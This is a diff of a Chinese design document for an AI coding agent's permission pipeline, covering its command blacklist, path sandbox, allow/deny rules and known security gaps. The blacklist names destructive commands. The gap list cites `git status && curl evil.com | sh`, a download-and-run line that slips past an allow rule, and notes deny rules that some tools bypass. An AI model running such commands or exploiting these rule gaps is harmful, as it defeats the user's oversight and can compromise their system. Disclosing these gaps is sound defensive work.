@@ -929,7 +929,7 @@ Token 大头是工具结果。这层不调模型，把过大的工具结果写�
 
 1. **危险命令黑名单**（`blacklist.py`）：正则拦截 `rm -rf` / `git push --force` / fork 炸弹 / `format`、`Remove-Item -Recurse -Force` 等已知高危命令，复合命令逐段 + 整条双重检查；**不可被任何配置或权限模式放开**。
 2. **路径沙箱**（复用 `path_guard`）：文件、glob、grep 工具以**调用者的工作目录**为边界——主对话与普通子 Agent 是项目根，**隔离子 Agent 是它自己的工作区**（c14）；拒绝含 `..`、解析后越界的绝对路径、指向项目外的符号链接。边界由调用方显式给出、**没有默认值**：漏传时判定为拒绝，绝不回退到项目根——回退会造成「按工作区批准了 `a.py`、却写到项目根的 `a.py`」，两边都不报错。
-3. **可配置规则**（`rules.py`）：三层 YAML 的 allow/deny，deny 永远优先。
+3. **可配置规则**（`rules.py`）：三层 YAML 的 allow/deny，deny 永远优先。命令类规则里 **deny 走「整条 + 逐段」**（与①同口径——`deny: Bash(git push *)` 拦得住 `git status && git push origin main`），**allow 只匹配整条**：拆段只会让命中变多，用在放行侧等于把用户写下的窄放行悄悄扩成宽放行。⚠ allow 侧另有一个未修的缺口，见下方「后续补齐项」第 1 条。
 4. **权限模式**（`/perm`）：严格 / 默认 / 放行，只兜底「规则未命中」的灰色地带，翻不了 ①②③ 的 deny。
 5. **人在回路**：判定为「问用户」时弹确认面板，四选项（本次 / 本会话 / 永久 / 拒绝）。
 
@@ -1202,11 +1202,11 @@ C10（斜杠命令系统）、C9（记忆系统）、C8（上下文管理）、C
 
 以下问题已在工程审查中确认，但不属于当前阶段开发范围，后续章节再统一设计和实现：
 
-1. **③可配置规则层对复合命令不拆段**（**已知安全缺口**，C12 验收期实测发现）：`deny: Bash(git push *)` 拦得住 `git push origin main`，却拦不住 `git status && git push origin main`——①危险命令黑名单是逐段检查的，③规则层不是。而这**不需要刻意规避**，真实模型在一次普通请求里就会写出复合命令。C12 已在 Hook 侧补齐同一口径，**权限层未动**（那会改变 C6 的规则语义，属于安全边界的行为变更，应单独评审）。详见 [`docs/todo/1-perm-compound-command.md`](docs/todo/1-perm-compound-command.md)。
-2. **`system_serial` 的工具绕过③规则层**（**已知安全缺口**，C15 验收期按 checklist 逐条实测发现）：`deny: run_agent` / `deny: send_message` **一条都不生效**——那类工具在权限预扫里直接拿到 ALLOW、根本不调权限引擎。影响 7 个工具（委派、Skill 加载、五个协作工具）。危害不在「这些工具危险」（它们不读写文件也不执行命令），而在**文档一度承诺了「可以用 deny 禁掉」，那是错的**——用户会以为自己关掉了某个能力，实际没有。这是**从 C13 起就写错的注释**，已修正文档、加了两条护栏，代码未动（属安全边界变更，应单独评审）。唯一仍有效的收窄手段是 Hook 的 `pre_tool_use`。详见 [`docs/todo/2-perm-system-serial-bypass.md`](docs/todo/2-perm-system-serial-bypass.md)。
-3. **模型不会主动组队**（C15 真实模型验收发现）：协作机制本身好用——明说「组个队」它一次就做对；但两轮自然场景里它都选择自己做完。已补系统提示槽位仍不充分，与「模型欠触发 Skill」同源，属行业级偏差。⚠ **只在快速小模型上验证过，换强模型是否改善尚未测过**——那正是待办的第一步。详见 [`docs/todo/5-team-adoption.md`](docs/todo/5-team-adoption.md)。
+1. **`allow` 命令规则的末尾通配跨分隔符**（**已知安全缺口**，2026-08-09 实施期发现）：`allow: Bash(git *)` 整串命中 `git status && curl evil.com | sh`——第二段是完全无关的命令，却随第一段一起在③层被放行，**确认面板一次都不弹**（此时只剩①危险命令黑名单，而 `curl … | sh` 不在里面）。同一处还有个方向相反的可用性症状：`cat x ; git ls-files` 整串对不上 `git *`，在非交互的子 Agent 环境下被自动拒绝（C14 实测）。根因相同——allow 侧把复合命令当一整根字符串在比。**deny 侧的同类缺口已修**（现在走「整条 + 逐段」，一个 `&&` 藏不住东西）；allow 侧的改法**不是**「也拆段」（那是放宽），而是「每一段都得命中」，属安全边界变更需单独评审。详见 [`docs/todo/2-perm-allow-wildcard-spans-separators.md`](docs/todo/2-perm-allow-wildcard-spans-separators.md)。
+2. **`system_serial` 的工具绕过③规则层**（**已知安全缺口**，C15 验收期按 checklist 逐条实测发现）：`deny: run_agent` / `deny: send_message` **一条都不生效**——那类工具在权限预扫里直接拿到 ALLOW、根本不调权限引擎。影响 7 个工具（委派、Skill 加载、五个协作工具）。危害不在「这些工具危险」（它们不读写文件也不执行命令），而在**文档一度承诺了「可以用 deny 禁掉」，那是错的**——用户会以为自己关掉了某个能力，实际没有。这是**从 C13 起就写错的注释**，已修正文档、加了两条护栏，代码未动（属安全边界变更，应单独评审）。唯一仍有效的收窄手段是 Hook 的 `pre_tool_use`。详见 [`docs/todo/1-perm-system-serial-bypass.md`](docs/todo/1-perm-system-serial-bypass.md)。
+3. **模型不会主动组队**（C15 真实模型验收发现）：协作机制本身好用——明说「组个队」它一次就做对；但两轮自然场景里它都选择自己做完。已补系统提示槽位仍不充分，与「模型欠触发 Skill」同源，属行业级偏差。⚠ **只在快速小模型上验证过，换强模型是否改善尚未测过**——那正是待办的第一步。详见 [`docs/todo/6-team-adoption.md`](docs/todo/6-team-adoption.md)。
 4. **`Esc` 不会取消正在跑的子 Agent**（C14 真实模型验收实测发现）：按 `Esc` 只停主循环，子 Agent 线程继续跑到底——实测里它在 `Esc` 之后又跑了 7 轮、写文件、提交、留下一个工作区。隔离场景下不至于造成损害（写的都在工作区里），但**非隔离子 Agent 会继续往主项目根里写**。要停它现在得用 `/agents cancel all`。改法牵动 C13「委派永不阻塞」的契约，需单独决策，详见 [`docs/todo/3-subagent-cancel-semantics.md`](docs/todo/3-subagent-cancel-semantics.md)。
-5. **`worktree.link` 目前一律降级为 `copy`**：软链指向工作区之外，被权限管线第②层拒绝，子 Agent 一个字节都读不到。已止血为「降级 + 明确警告」，要真正可用得动第②层边界判定，详见 [`docs/todo/7-worktree-link-sandbox.md`](docs/todo/7-worktree-link-sandbox.md)。
+5. **`worktree.link` 目前一律降级为 `copy`**：软链指向工作区之外，被权限管线第②层拒绝，子 Agent 一个字节都读不到。已止血为「降级 + 明确警告」，要真正可用得动第②层边界判定，详见 [`docs/todo/8-worktree-link-sandbox.md`](docs/todo/8-worktree-link-sandbox.md)。
 6. 子 Agent 工作区隔离后续项：主对话自身进出隔离工作区、工作区之间的合并策略、后台定时清理与手动清理入口、把主项目根的未提交改动带入工作区、由系统代替子 Agent 提交、环境初始化的启发式自动识别、按「已合并」判定删除分支、非 Git 版本控制系统的隔离。另有三条已知边界与 OS 级沙箱同源：MCP 工具不受工作目录隔离约束、`run_command` 子进程内部的路径访问不受约束、隔离工作区里没有 `.rhinecode/`（不影响项目级配置生效，它们在装配期就已加载进内存）。
 7. Hook 系统后续项：子 Agent 动作的真实运行（现为占位）、`once` 的持久化、执行顺序的显式优先级、迭代级事件、配置中的字符串插值、HTTP 动作参与拦截决策、`/hooks reload` 热更新、本地级 `hooks.yaml`、在 Skill frontmatter 里声明 Hook、Hook 修改工具参数或工具结果。
 8. Skill 系统：市场分发与版本管理、嵌套激活、参数 schema、模板引擎、并行执行、跨会话保持激活态、文件监听式自动热更新（当前需显式 `/skills reload`）。
